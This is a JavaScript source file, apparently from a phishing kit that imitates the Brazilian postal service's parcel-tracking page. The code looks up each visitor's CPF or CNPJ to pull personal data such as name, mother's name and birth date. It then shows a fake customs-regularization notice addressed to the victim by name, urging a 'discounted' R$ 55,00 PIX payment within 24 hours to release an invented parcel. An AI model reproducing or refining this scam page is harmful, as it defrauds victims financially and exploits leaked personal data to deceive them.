/**
 * Index.js - Arquivo Principal Otimizado com Encomenda Personalizada
 * Versão corrigida: Sistema de consulta para CPF, CNPJ e código de rastreio
 * NOVO: Sistema de encomenda personalizada com dados reais
 */

import * as alerta from '../core/templates/bunker/js/alerta.js';
import * as forms from '../core/templates/bunker/js/forms.js';
import * as CodigoObjeto from '../core/js/rastroGeral.js';
import * as rastroUnico from '../core/js/rastroUnico.js';
import * as rastroMulti from '../core/js/rastroMulti.js';
import * as botoes from '../core/js/botoes.js';
import * as modal from '../core/templates/bunker/js/modal.js';

import { 
    DOM_IDS, 
    CSS_CLASSES, 
    SELECTORS, 
    ERROR_MESSAGES,
    ENDPOINTS 
} from './constants.js';

import { 
    trackingHeaderTemplate,
    breadcrumbTemplate,
    pageTitleTemplate,
    socialShareTemplate,
    formatTrackingCode,
    viewMoreTemplate
} from './templates.js';

import { 
    domCache,
    debounce,
    CodeValidator,
    DOMUtils,
    URLUtils
} from './utils.js';

import { 
    TrackingAPI,
    CaptchaAPI,
    apiManager
} from './api.js';

/**
 * Classe principal otimizada para gerenciar o sistema
 */
class TrackingSystem {
    constructor() {
        this.isInitialized = false;
        this.setupEventListeners();
        this.initializeValidation();
    }

    setupEventListeners() {
        const searchButton = domCache.get(`#${DOM_IDS.SEARCH_BUTTON}`);
        const trackingInput = domCache.get(`#${DOM_IDS.TRACKING_INPUT}`);
        const refreshButton = domCache.get(`#${DOM_IDS.REFRESH_BUTTON}`);
        const invokeButton = domCache.get(`#${DOM_IDS.INVOKE_BUTTON}`);

        searchButton?.addEventListener('click', () => this.handleSearch());
        
        window.addEventListener('keydown', (event) => {
            if (event.keyCode === 13) {
                this.handleSearch();
                return false;
            }
        });

        trackingInput?.addEventListener('input', 
            debounce(() => this.validateTrackingField(), 300)
        );

        refreshButton?.addEventListener('click', () => this.refreshCaptcha());
        invokeButton?.addEventListener('click', () => this.handleController());
    }

    initializeValidation() {
        this.isInitialized = true;
    }

    async validateTrackingField() {
        const input = domCache.get(`#${DOM_IDS.TRACKING_INPUT}`);
        if (!input) return;

        const cleanedInput = CodeValidator.cleanInput(input.value);
        
        if (!cleanedInput) {
            forms.setValidade(input, '');
            return;
        }

        if (this.shouldValidateLength(cleanedInput.length)) {
            const validation = CodeValidator.validateTrackingInput(cleanedInput);
            forms.setValidade(input, validation.error ? validation.message : '');
        }
    }

    shouldValidateLength(length) {
        return length === 11 || length === 14 || length === 13 || length === 12 || length % 13 === 0;
    }

    validateCaptchaField() {
		const input = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`);
		if (!input) return false;

		const captcha = input.value.trim();
		
		if (!captcha) {
			forms.setValidade(input, ERROR_MESSAGES.FILL_CAPTCHA);
			return false;
		}

		return true;
	}

    async handleSearch() {
		const trackingInput = domCache.get(`#${DOM_IDS.TRACKING_INPUT}`);
		const captchaInput = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`);
		
		if (!trackingInput || !captchaInput) return;

		// Pegar valor limpo (remover tudo exceto letras e números)
		const valorOriginal = trackingInput.value;
		const valorLimpo = valorOriginal.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
		
		if (!valorLimpo) {
			forms.setValidade(trackingInput, 'Por favor, digite um código de rastreio, CPF ou CNPJ');
			return;
		}

		// Determinar tipo de entrada
		const tipoEntrada = this.determinarTipoEntrada(valorLimpo);
		
		if (!tipoEntrada) {
			forms.setValidade(trackingInput, 'Código de objeto, CPF ou CNPJ informado não está válido');
			return;
		}

		// Validar captcha - APENAS VERIFICAR SE ESTÁ VAZIO
		const captcha = captchaInput.value.trim();
		if (!captcha) {
			forms.setValidade(captchaInput, ERROR_MESSAGES.FILL_CAPTCHA);
			return;
		}

		// Limpar possíveis erros anteriores do captcha
		forms.setValidade(captchaInput, '');
		forms.setValidade(trackingInput, '');

		// Processar usando resultado.php
		try {
			alerta.abre('Consultando...');
			
			const dados = await this.consultarResultado(valorLimpo);
			
			alerta.fecha();
			
			// Processar baseado no tipo retornado
			switch (dados.tipo) {
				case 'cpf':
					this.processarDadosCPF(dados, valorLimpo);
					break;
				case 'cnpj':
					this.processarDadosCNPJ(dados, valorLimpo);
					break;
				case 'rastreio':
					this.processarDadosRastreio(dados, valorLimpo);
					break;
				default:
					// Fallback para código de rastreio sem consulta
					this.processarCodigoRastreio(valorLimpo);
					break;
			}
			
			// Ações finais sempre executadas
			this.finalizarConsulta();
			
		} catch (error) {
			alerta.fecha();
			this.handleSearchError(error);
			this.refreshCaptcha();
		}
	}

    processarDadosCPF(dados, cpf) {
        // Salvar dados em variáveis globais
        window.dadosUsuario = {
            nome: dados.nome,
            mae: dados.mae,
            nascimento: dados.nascimento,
            cpf: dados.cpf,
            sexo: dados.sexo
        };
        
        // Atualizar trilha
        this.atualizarTrilha(cpf);
        
        // Atualizar título com nome
        this.atualizarTitulo(`Olá, ${dados.nome}`);
    }

    processarDadosCNPJ(dados, cnpj) {
        // Salvar dados em variáveis globais
        window.dadosEmpresa = {
            nome: dados.nome,
            fantasia: dados.fantasia,
            cnpj: dados.cnpj,
            situacao: dados.situacao,
            atividade_principal: dados.atividade_principal,
            endereco: {
                logradouro: dados.logradouro,
                numero: dados.numero,
                municipio: dados.municipio,
                uf: dados.uf,
                cep: dados.cep
            },
            contato: {
                telefone: dados.telefone,
                email: dados.email
            }
        };
        
        // Atualizar trilha
        this.atualizarTrilha(cnpj);
        
        // Atualizar título no formato: Olá, fantasia / nome
        let titulo = 'Olá, ';
        if (dados.fantasia && dados.fantasia.trim()) {
            titulo += `${dados.fantasia}`;
        } else {
            titulo += dados.nome;
        }
        this.atualizarTitulo(titulo);
    }

    processarDadosRastreio(dados, codigo) {
        // Atualizar trilha
        this.atualizarTrilha(codigo);
        
        // Formatar código e atualizar título
        const codigoFormatado = this.formatarCodigoRastreio(codigo);
        this.atualizarTitulo(codigoFormatado);
    }

    async processarCodigoRastreio(codigo) {
        // Atualizar trilha
        this.atualizarTrilha(codigo);
        
        // Formatar código e atualizar título
        const codigoFormatado = this.formatarCodigoRastreio(codigo);
        this.atualizarTitulo(codigoFormatado);
    }

    async consultarResultado(objeto) {
        const captcha = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`).value;
        const url = `resultado.php?objeto=${objeto}&captcha=${captcha}`;
        
        try {
            const response = await fetch(url);
            
            if (!response.ok) {
                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            const data = await response.json();
            
            if (data.erro) {
                throw new Error(data.mensagem || 'Erro na consulta');
            }
            
            return data;
            
        } catch (error) {
            if (error.message.includes('fetch')) {
                throw new Error('Erro de conexão. Verifique sua internet.');
            }
            throw error;
        }
    }

    atualizarTrilha(codigo) {
        const trilha = domCache.get(`#${DOM_IDS.BREADCRUMB}`);
        
        if (!trilha) return;
        
        const links = trilha.querySelectorAll('a');
        
        // Se tem mais de 2 links, remove o último
        if (links.length > 2) {
            const ultimoLink = links[links.length - 1];
            ultimoLink.remove();
        }
        
        // Adiciona novo link com formatação
        const novoLink = document.createElement('a');
        novoLink.textContent = this.formatarParaTrilha(codigo);
        trilha.appendChild(novoLink);
    }

    formatarParaTrilha(codigo) {
        // Se for CPF (11 dígitos), formatar como 000.000.000-00
        if (/^[0-9]{11}$/.test(codigo)) {
            return `${codigo.substring(0, 3)}.${codigo.substring(3, 6)}.${codigo.substring(6, 9)}-${codigo.substring(9, 11)}`;
        }
        // Se for CNPJ (14 dígitos), formatar como 00.000.000/0000-00
        if (/^[0-9]{14}$/.test(codigo)) {
            return `${codigo.substring(0, 2)}.${codigo.substring(2, 5)}.${codigo.substring(5, 8)}/${codigo.substring(8, 12)}-${codigo.substring(12, 14)}`;
        }
        // Senão, retorna como está
        return codigo;
    }

    atualizarTitulo(texto) {
        const tituloH3 = domCache.get('#titulo-pagina h3');
        
        if (tituloH3) {
            tituloH3.textContent = texto;
        }
    }

    formatarCodigoRastreio(codigo) {
        // Formato: ND 575 882 651 BR
        if (codigo.length !== 13) return codigo;
        
        return `${codigo.substring(0, 2)} ${codigo.substring(2, 5)} ${codigo.substring(5, 8)} ${codigo.substring(8, 11)} ${codigo.substring(11, 13)}`;
    }

    // === SISTEMA DE ENCOMENDA PERSONALIZADA ===
    
    /**
     * Determina a imagem da encomenda baseada no tipo e valor
     */
    determinarImagemEncomenda(tipo, valor) {
        let numeroImagem = 0;
        
        if (tipo === 'CPF') {
            // CPF: usa o 9º dígito (posição 8)
            numeroImagem = parseInt(valor.charAt(8)) || 0;
        } else if (tipo === 'CNPJ') {
            // CNPJ: usa o último dígito
            numeroImagem = parseInt(valor.charAt(valor.length - 1)) || 0;
        } else if (tipo === 'CODIGO_RASTREIO') {
            // Código de rastreio: usa o primeiro número após as duas letras (posição 2)
            numeroImagem = parseInt(valor.charAt(2)) || 0;
        }
        
        return `../static/rastreamento-internet/imgs/encomenda${numeroImagem}.png`;
    }

    /**
     * Gera texto formatado para a imagem
     */
    gerarTextoImagem(dados, tipo, valorOriginal) {
        let textoSuperior = '';
        let textoInferior = '';
        
        switch (tipo) {
            case 'CPF':
                const cpfFormatado = this.formatarParaTrilha(valorOriginal);
                textoSuperior = `Destinatário:\n${dados.nome.toUpperCase()}`;
                textoInferior = `CPF:\n${cpfFormatado}`;
                break;
                
            case 'CNPJ':
                const cnpjFormatado = this.formatarParaTrilha(valorOriginal);
                const nomeDestinatario = dados.fantasia?.trim() ? dados.fantasia : dados.nome;
                textoSuperior = `Destinatário:\n${nomeDestinatario.toUpperCase()}`;
                textoInferior = `CNPJ:\n${cnpjFormatado}`;
                break;
                
            case 'CODIGO_RASTREIO':
                const codigoFormatado = this.formatarCodigoRastreio(valorOriginal);
                textoSuperior = codigoFormatado;
                textoInferior = '';
                break;
                
            default:
                textoSuperior = valorOriginal;
                textoInferior = '';
        }
        
        return { textoSuperior, textoInferior };
    }

    gerarImagemEncomenda(dados, tipo, valorOriginal) {
        const imagemSrc = this.determinarImagemEncomenda(tipo, valorOriginal);
        const { textoSuperior, textoInferior } = this.gerarTextoImagem(dados, tipo, valorOriginal);
        
        // Posições específicas por tipo
        const posicoes = this.obterPosicoesPorTipo(tipo);
        
        return `
            <div class="encomenda-personalizada" style="
                position: relative; 
                display: inline-block; 
                max-width: 100%;
                user-select: none;
                -webkit-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
            ">
                <img src="${imagemSrc}" 
                     alt="Encomenda" 
                     style="
                        width: 100%; 
                        max-width: 350px; 
                        height: auto; 
                        display: block;
                        user-select: none;
                        -webkit-user-select: none;
                        -moz-user-select: none;
                        -ms-user-select: none;
                        pointer-events: none;
                     ">
                
                <!-- Overlay com texto superior -->
                ${textoSuperior ? `
                <div class="dados-overlay-superior" style="
                    position: absolute;
                    top: ${posicoes.superior.top};
                    left: ${posicoes.superior.left};
                    font-family: Arial, sans-serif;
                    font-size: clamp(10px, 2.5vw, 14px);
                    font-weight: bold;
                    color: #000;
                    line-height: 1.2;
                    max-width: 80%;
                    word-wrap: break-word;
                    white-space: pre-line;
                    text-shadow: 0 0 1px rgba(0,0,0,0.3);
                    filter: blur(0.3px);
                    user-select: none;
                    -webkit-user-select: none;
                    -moz-user-select: none;
                    -ms-user-select: none;
                    pointer-events: none;
                ">
                    ${this.processarTextoParaMobile(textoSuperior, tipo)}
                </div>
                ` : ''}
                
                <!-- Overlay com texto inferior -->
                ${textoInferior ? `
                <div class="dados-overlay-inferior" style="
                    position: absolute;
                    top: ${posicoes.inferior.top};
                    left: ${posicoes.inferior.left};
                    font-family: Arial, sans-serif;
                    font-size: clamp(10px, 2.5vw, 14px);
                    font-weight: bold;
                    color: #000;
                    line-height: 1.2;
                    max-width: 80%;
                    word-wrap: break-word;
                    white-space: pre-line;
                    text-shadow: 0 0 1px rgba(0,0,0,0.3);
                    filter: blur(0.3px);
                    user-select: none;
                    -webkit-user-select: none;
                    -moz-user-select: none;
                    -ms-user-select: none;
                    pointer-events: none;
                ">
                    ${this.processarTextoParaMobile(textoInferior, tipo)}
                </div>
                ` : ''}
                
                <!-- CSS responsivo para mobile -->
                <style>
                    /* Desktop: layout normal - span inline não quebra */
                    .desktop-layout {
                        display: inline;
                        white-space: pre-line;
                    }
                    
                    .mobile-layout {
                        display: none;
                    }
                    
                    @media (max-width: 768px) {
                        .dados-overlay-superior {
                            ${tipo === 'CPF' || tipo === 'CNPJ' ? `
                                top: 45% !important;
                                left: 8% !important;
                                font-size: clamp(9px, 2.8vw, 13px) !important;
                                white-space: normal !important;
                            ` : `
                                top: 48% !important;
                                left: 90% !important;
                            `}
                        }
                        
                        .dados-overlay-inferior {
                            ${tipo === 'CPF' || tipo === 'CNPJ' ? `
                                top: 58% !important;
                                left: 8% !important;
                                font-size: clamp(9px, 2.8vw, 13px) !important;
                                white-space: normal !important;
                            ` : `
                                top: 61% !important;
                                left: 90% !important;
                            `}
                        }
                        
                        /* Mobile: mostrar layout diferenciado apenas para CPF/CNPJ */
                        ${tipo === 'CPF' || tipo === 'CNPJ' ? `
                            .desktop-layout {
                                display: none !important;
                            }
                            
                            .mobile-layout {
                                display: inline !important;
                            }
                            
                            .texto-mobile-label {
                                display: inline-block;
                                margin-right: 10px;
                            }
                            
                            .texto-mobile-valor {
                                display: inline-block;
                                margin-left: 15px;
                            }
                        ` : ''}
                    }
                    
                    @media (max-width: 480px) {
                        .dados-overlay-superior {
                            ${tipo === 'CPF' || tipo === 'CNPJ' ? `
                                top: 46% !important;
                                left: 6% !important;
                                font-size: clamp(8px, 3.2vw, 12px) !important;
                            ` : `
                                top: 49% !important;
                                left: 10% !important;
                            `}
                        }
                        
                        .dados-overlay-inferior {
                            ${tipo === 'CPF' || tipo === 'CNPJ' ? `
                                top: 59% !important;
                                left: 6% !important;
                                font-size: clamp(8px, 3.2vw, 12px) !important;
                            ` : `
                                top: 62% !important;
                                left: 10% !important;
                            `}
                        }
                        
                        ${tipo === 'CPF' || tipo === 'CNPJ' ? `
                            .texto-mobile-valor {
                                margin-left: 25px !important;
                            }
                        ` : ''}
                    }
                </style>
            </div>
        `;
    }

    /**
     * Processa texto com alinhamento diferenciado APENAS para mobile
     */
    processarTextoParaMobile(texto, tipo) {
        // Se não é CPF/CNPJ, retorna normal
        if (tipo !== 'CPF' && tipo !== 'CNPJ') {
            return texto;
        }
        
        // Divide pelo \n para separar label e valor
        const linhas = texto.split('\n');
        if (linhas.length !== 2) return texto;
        
        const [label, valor] = linhas;
        
        return `<span class="desktop-layout">${texto}</span><span class="mobile-layout"><span class="texto-mobile-label">${label}</span><span class="texto-mobile-valor">${valor}</span></span>`;
    }
    obterPosicoesPorTipo(tipo) {
        switch (tipo) {
            case 'CPF':
            case 'CNPJ':
                return {
                    superior: { top: '42%', left: '15%' }, // Ajuste mínimo pra baixo
                    inferior: { top: '55%', left: '15%' }
                };
            
            case 'CODIGO_RASTREIO':
                return {
                    superior: { top: '50%', left: '15%' }, // Mais pra baixo
                    inferior: { top: '63%', left: '15%' }
                };
            
            default:
                return {
                    superior: { top: '45%', left: '15%' },
                    inferior: { top: '58%', left: '15%' }
                };
        }
    }

    gerarConteudoJumbotronComImagem(dados, tipo, valorOriginal) {
        const imagemEncomenda = this.gerarImagemEncomenda(dados, tipo, valorOriginal);
        
        return `
            <div class="campos"></div>
            <div class="campos captcha">
                <div class="campo">
                    <div class="rotulo">
                        <label for="objeto">
                            <div class="container-encomenda" style="
                                display: flex; 
                                gap: 20px; 
                                background-color: white; 
                                padding: 20px; 
                                border-radius: 5px; 
                                border: 1px solid #dee2e6;
                                flex-wrap: wrap;
                            ">
                                
                                <!-- Coluna do texto -->
                                <div class="coluna-texto" style="
                                    flex: 1;
                                    min-width: 300px;
                                ">
                                    <h4 style="color: #00416b; margin-bottom: 15px; font-size: clamp(16px, 4vw, 20px);">
                                        Regularização de Encomenda Internacional
                                    </h4>
                                    
                                    <p style="margin-bottom: 10px; font-size: clamp(14px, 3vw, 16px);">
                                        <strong>Prezado(a) ${tipo === 'CPF' ? dados.nome : (dados.fantasia?.trim() ? dados.fantasia : dados.nome)},</strong>
                                    </p>
                                    
                                    <p style="margin-bottom: 15px; font-size: clamp(13px, 2.8vw, 15px); line-height: 1.5;">
                                        Informamos que sua encomenda internacional foi processada pela 
                                        Receita Federal e encontra-se disponível para retirada em nossa 
                                        unidade de distribuição, mediante o pagamento das taxas de 
                                        importação devidas.
                                    </p>
                                    
                                    <div style="
                                        background-color: #e3f2fd; 
                                        padding: 15px; 
                                        border-radius: 3px; 
                                        margin: 15px 0;
                                        overflow-x: auto;
                                    ">
                                        <table style="width: 100%; border: none; min-width: 250px;">
                                            <tr>
                                                <td style="padding: 5px 10px 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);"><strong>Situação:</strong></td>
                                                <td style="padding: 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);">Aguardando regularização tributária</td>
                                            </tr>
                                            <tr>
                                                <td style="padding: 5px 10px 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);"><strong>Prazo:</strong></td>
                                                <td style="padding: 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);">24 horas</td>
                                            </tr>
                                            <tr>
                                                <td style="padding: 5px 10px 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);"><strong>Valor original:</strong></td>
                                                <td style="padding: 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);">R$ 137,50</td>
                                            </tr>
                                            <tr>
                                                <td style="padding: 5px 10px 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);"><strong>Valor promocional (60% desconto):</strong></td>
                                                <td style="padding: 5px 0; border: none; font-size: clamp(12px, 2.5vw, 14px);"><strong>R$ 55,00</strong></td>
                                            </tr>
                                        </table>
                                    </div>
                                    
                                    <p style="
                                        font-size: clamp(11px, 2.2vw, 13px); 
                                        color: #6c757d; 
                                        margin-top: 15px; 
                                        line-height: 1.4;
                                    ">
                                        O pagamento pode ser realizado via PIX para liberação imediata. 
                                        Após o vencimento do prazo, a encomenda será devolvida ao 
                                        remetente conforme regulamentação postal.
                                    </p>
                                </div>
                            </div>
                        </label>
                    </div>
                </div>
                <div class="campo">
                    <div class="controle" style="
                        display: flex; 
                        gap: 10px; 
                        flex-wrap: wrap; 
                        justify-content: center;
                    ">
						<!-- Coluna da imagem -->
						<div class="coluna-imagem" style="
							flex: 0 0 auto;
							min-width: 250px;
							max-width: 100%;
						">
							${imagemEncomenda}
						</div><br>
                        <button type="button" id="b-pesquisar" name="b-pesquisar" class="btn btn-primary botao-principal">
                            REALIZAR PAGAMENTO
                        </button>
                        <button type="button" id="b-voltar" name="b-voltar" 
                                class="btn btn-primary botao-principal" 
                                onclick="location.reload()">
                            Voltar
                        </button>
                    </div>
                </div>
            </div>
            
            <style>
                @media (max-width: 768px) {
                    .container-encomenda {
                        flex-direction: column !important;
                        align-items: center;
                    }
                    
                    .coluna-imagem {
                        text-align: center;
                        min-width: 100% !important;
                    }
                    
                    .coluna-texto {
                        min-width: 100% !important;
                    }
                    
                    .encomenda-personalizada {
                        max-width: 300px;
                        margin: 0 auto;
                    }
                }
                
                @media (max-width: 480px) {
                    .container-encomenda {
                        padding: 15px !important;
                        gap: 15px !important;
                    }
                    
                    .encomenda-personalizada {
                        max-width: 250px;
                    }
                }
            </style>
        `;
    }

    finalizarConsulta() {
        // Remover classe "oculto" do tabs-rastreamento
        const tabsRastreamento = domCache.get(`#${DOM_IDS.TRACKING_TABS}`);
        if (tabsRastreamento) {
            DOMUtils.removeClass(tabsRastreamento, 'oculto');
        }
        
        // Adicionar conteúdo específico no jumbotron
        const jumbotron = domCache.get('.jumbotron');
        if (jumbotron) {
            let novoConteudo = '';
            
            // Verificar se temos dados do usuário para personalizar
            if (window.dadosUsuario && window.dadosUsuario.nome) {
                novoConteudo = this.gerarConteudoJumbotronComImagem(
                    window.dadosUsuario, 
                    'CPF', 
                    window.dadosUsuario.cpf
                );
            } else if (window.dadosEmpresa && window.dadosEmpresa.nome) {
                novoConteudo = this.gerarConteudoJumbotronComImagem(
                    window.dadosEmpresa, 
                    'CNPJ', 
                    window.dadosEmpresa.cnpj
                );
            } else {
                // Para código de rastreio ou fallback
                const trackingInput = domCache.get(`#${DOM_IDS.TRACKING_INPUT}`);
                const valorOriginal = trackingInput ? trackingInput.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase() : '';
                
                if (valorOriginal && /^[A-Z]{2}[0-9]{9}[A-Z]{2}$/.test(valorOriginal)) {
                    novoConteudo = this.gerarConteudoJumbotronComImagem(
                        { nome: 'Destinatário' }, 
                        'CODIGO_RASTREIO', 
                        valorOriginal
                    );
                }
            }
            
            if (novoConteudo) {
                DOMUtils.setHTML(jumbotron, novoConteudo);
            }
        }
        
        // === SCROLL INSTANTÂNEO PARA O TOPO ===
        this.scrollToTopInstant();
    }

    scrollToTopInstant() {
        // Método mais compatível e instantâneo
        window.scrollTo(0, 0);
        
        // Força o scroll também no body e html (garantia para todos os navegadores)
        document.documentElement.scrollTop = 0;
        document.body.scrollTop = 0;
        
        // Para iOS Safari e alguns navegadores mobile
        if (window.pageYOffset !== undefined) {
            window.pageYOffset = 0;
        }
    }

    // === NOVOS MÉTODOS PARA SISTEMA DE CONSULTA ===
    
    determinarTipoEntrada(valor) {
        const PATTERNS = {
            CPF: /^[0-9]{11}$/,
            CNPJ: /^[0-9]{14}$/,
            CODIGO_RASTREIO: /^[A-Z]{2}[0-9]{9}[A-Z]{2}$/
        };

        if (PATTERNS.CPF.test(valor)) {
            return 'CPF';
        }
        if (PATTERNS.CNPJ.test(valor)) {
            return 'CNPJ';
        }
        if (PATTERNS.CODIGO_RASTREIO.test(valor)) {
            return 'CODIGO_RASTREIO';
        }
        return null;
    }

    refreshCaptcha() {
        if (typeof window.captcha_image_audioObj !== 'undefined') {
            window.captcha_image_audioObj.refresh();
        }
        
        const captchaImage = domCache.get(`#${DOM_IDS.CAPTCHA_IMAGE}`);
        const captchaInput = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`);
        
        if (captchaInput) captchaInput.value = '';
        if (captchaImage) {
            captchaImage.src = CaptchaAPI.refreshImage();
            captchaImage.blur();
        }
    }

    async handleController() {
        try {
            const data = await TrackingAPI.getControlData();
            
            if (data.form_retorno === 'rastreamento') {
                if (data.listaObjetos?.length) {
                    const objInput = domCache.get(`#${DOM_IDS.TRACKING_INPUT}`);
                    if (objInput) objInput.value = data.listaObjetos;
                }
            } else if (data.logado) {
                await this.handleDocumentSearch();
            }
            
        } catch (error) {
            alerta.abre(error.message, 10, 'OK');
        }
    }

    async handleDocumentSearch() {
        console.log('Busca por documento - funcionalidade mantida');
    }

    handleSearchError(error) {
		if (error.message === ERROR_MESSAGES.INVALID_CAPTCHA) {
			const captchaInput = domCache.get(`#${DOM_IDS.CAPTCHA_INPUT}`);
			forms.setValidade(captchaInput, ERROR_MESSAGES.INVALID_CAPTCHA);
		} else {
			alerta.abre(error.message, 10, 'OK');
		}
	}

    destroy() {
        apiManager.cancelAllRequests();
        domCache.clear();
    }
}

// Inicialização otimizada
document.addEventListener('DOMContentLoaded', () => {
    window.trackingSystem = new TrackingSystem();
});

window.addEventListener('beforeunload', () => {
    if (window.trackingSystem) {
        window.trackingSystem.destroy();
    }
});